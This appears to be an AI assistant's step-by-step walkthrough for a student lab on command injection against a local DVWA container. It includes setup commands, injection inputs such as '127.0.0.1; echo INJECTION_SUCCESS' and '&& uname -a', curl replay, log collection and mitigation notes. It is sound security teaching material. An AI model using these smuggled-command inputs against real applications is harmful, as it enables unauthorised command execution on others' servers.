@@ -1,0 +1,229 @@
+Nice — here’s a **tight, exam-ready, step-by-step walkthrough** you can run on your **laptop (VM or native Linux)** to complete **Lab Program 4 — Command Injection**. I give the exact commands, what to click in the browser, safe example injections, how to capture & replay the request with `curl`, how to collect server log evidence, troubleshooting tips, and short viva answers. (This follows your uploaded lab sheet.) 
+
+---
+
+# Quick prep / requirements
+
+* A Linux machine or Linux VM (Kali/Ubuntu recommended).
+* sudo access.
+* Docker (we’ll install it below).
+* A browser (Firefox/Chrome) on the same machine.
+* Work offline / in a lab VM — **do not** test on public servers.
+
+---
+
+## 1 — Install & start Docker
+
+Run these commands in a terminal:
+
+```bash
+# refresh package lists
+sudo apt update
+
+# install Docker
+sudo apt install -y docker.io
+
+# enable & start Docker daemon
+sudo systemctl enable --now docker
+
+# (optional) let your user run docker without sudo — log out / in after this
+sudo usermod -aG docker $USER
+```
+
+Verify Docker is running:
+
+```bash
+sudo docker ps
+# or (if you used usermod and re-logged)
+docker ps
+```
+
+If `docker ps` shows no error, good.
+
+---
+
+## 2 — Start the DVWA container
+
+Pull & run DVWA (this will download the image first if needed):
+
+```bash
+sudo docker run --rm -d --name dvwa -p 8080:80 vulnerables/web-dvwa
+```
+
+Verify container is running:
+
+```bash
+sudo docker ps
+# you should see the dvwa container with PORTS 0.0.0.0:8080->80/tcp
+```
+
+If you used the usermod trick you can run `docker run ...` without `sudo` after relogging.
+
+---
+
+## 3 — Open DVWA and prepare the app
+
+1. Open browser and go to: `http://127.0.0.1:8080/` (or `http://localhost:8080/`).
+2. Login with default credentials:
+
+   * **Username:** `admin`
+   * **Password:** `password`
+3. On the main page click **Create/Reset DB** (so the database is ready).
+4. Go to **DVWA Security** and set **LOW** (for the lab exercises).
+
+---
+
+## 4 — Navigate to Command Injection page (baseline)
+
+1. In DVWA menu choose **Command Injection**.
+2. In the input box enter: `127.0.0.1` and click **Submit**.
+3. You should see `ping` output on the page — this confirms server runs `ping <your input>`. This is your baseline.
+
+---
+
+## 5 — Safe proof-of-concept injections (do these in the same input box)
+
+Paste each item below (one at a time) and click **Submit** — watch output on the page:
+
+* Echo marker:
+
+```
+127.0.0.1; echo INJECTION_SUCCESS
+```
+
+* Print system info:
+
+```
+127.0.0.1 && uname -a
+```
+
+* Short local ping:
+
+```
+127.0.0.1; ping -c 2 127.0.0.1
+```
+
+Notes:
+
+* `;` runs the next command unconditionally.
+* `&&` runs next command only if previous succeeded.
+* `||` would run next command only if previous failed.
+
+---
+
+## 6 — Capture the exact request using Browser DevTools (to replay later)
+
+1. Open DevTools: `Ctrl+Shift+I`.
+2. Switch to **Network** tab.
+3. Submit the DVWA form once (e.g., with `127.0.0.1`).
+4. In the Network list find the request (likely `POST /vulnerabilities/exec/`).
+5. Right-click that request → **Copy** → **Copy as cURL**.
+   Now you have a `curl '...' ... --data-raw 'ip=127.0.0.1&Submit=Submit'` command on clipboard.
+
+---
+
+## 7 — Modify & replay the request with `curl` (proof-of-concept outside browser)
+
+1. Paste the copied `curl` into a terminal or text editor.
+2. Modify only the POST data to include your injection. Example — change:
+
+```
+--data-raw 'ip=127.0.0.1&Submit=Submit'
+```
+
+to:
+
+```
+--data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit'
+```
+
+3. Run the modified `curl` in the terminal. Example minimal form (you may keep the headers the browser copied):
+
+```bash
+curl 'http://127.0.0.1:8080/vulnerabilities/exec/' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit'
+```
+
+4. Inspect the terminal output (HTML returned) — you should see `INJECTION_SUCCESS` somewhere in the response. That proves the request can be replayed outside browser and yields the injected output.
+
+**Quick grep trick** (show marker or say marker not found):
+
+```bash
+# run the curl and search output for marker
+curl 'http://127.0.0.1:8080/vulnerabilities/exec/' --data-raw 'ip=127.0.0.1; echo INJECTION_SUCCESS&Submit=Submit' 2>/dev/null | grep -C2 INJECTION_SUCCESS || echo "marker not found"
+```
+
+---
+
+## 8 — Collect server-side forensic evidence (Apache logs inside container)
+
+Tail Apache access log inside the running DVWA container (host terminal):
+
+```bash
+# view recent access log lines (match your request)
+sudo docker exec -it dvwa bash -lc 'tail -n 120 /var/log/apache2/access.log'
+
+# optionally filter:
+sudo docker exec -it dvwa bash -lc 'grep "vulnerabilities/exec" -n /var/log/apache2/access.log || echo "entry not found"'
+```
+
+You will see the request entries with timestamps and URL path — include these in your lab write-up as evidence.
+
+---
+
+## 9 — Save artifacts for submission
+
+* Save the modified `curl` command(s) (copy into a text file).
+* Save the terminal output that shows `INJECTION_SUCCESS`.
+* Save a screenshot of the DVWA page showing injected output.
+* Save the Apache log lines you extracted.
+* Optionally: `docker logs dvwa` may provide more output. Example:
+
+```bash
+sudo docker logs dvwa > dvwa_docker_logs.txt
+```
+
+---
+
+## 10 — Clean up (optional)
+
+Stop and remove the DVWA container:
+
+```bash
+sudo docker stop dvwa
+# container used --rm so it will be removed automatically when stopped
+```
+
+---
+
+# Troubleshooting (common exam hiccups)
+
+* **Page not reachable at :8080** — ensure Docker container is running and port 8080 not blocked: `sudo docker ps` and check `PORTS`. If another service uses 8080 change mapping: `-p 8081:80` and visit `http://127.0.0.1:8081/`.
+* **Login failing** — click Create/Reset DB first.
+* **DevTools didn’t capture request** — clear filter, reload page, re-submit the form.
+* **`curl` returns login page instead of result** — you copied a request that included cookies/session tokens; re-copy as cURL while logged in or include right `Cookie:` header in the curl. (Better: copy the cURL from DevTools while you are logged in.)
+
+---
+
+# Safety & ethics (say in viva)
+
+* Perform these labs only on systems you control (your VM) and with permission.
+* Command injection is a real vulnerability — never exploit it on production or third-party systems.
+
+---
+
+# Short viva Q&A (memorize)
+
+* **Q: What is command injection?**
+  A: When user-controlled input is executed by the OS/shell by the application, allowing arbitrary command execution.
+* **Q: Why does `127.0.0.1; echo INJECTION_SUCCESS` work?**
+  A: The server concatenates input into a shell command; the `;` terminates the first command and runs the next.
+* **Q: How to prove exploitation?**
+  A: Show injected output on the web page, replay with `curl`, and show server access logs with your request.
+* **Q: How to mitigate command injection?**
+  A: Avoid invoking shell with user input; use safe APIs, input validation/whitelisting, parameterized calls, and least privilege.
+
+---
+
+Would you like a **single-file checklist** (one-page) with only the exact commands and one-line instructions you can print for the exam? I can produce that now.
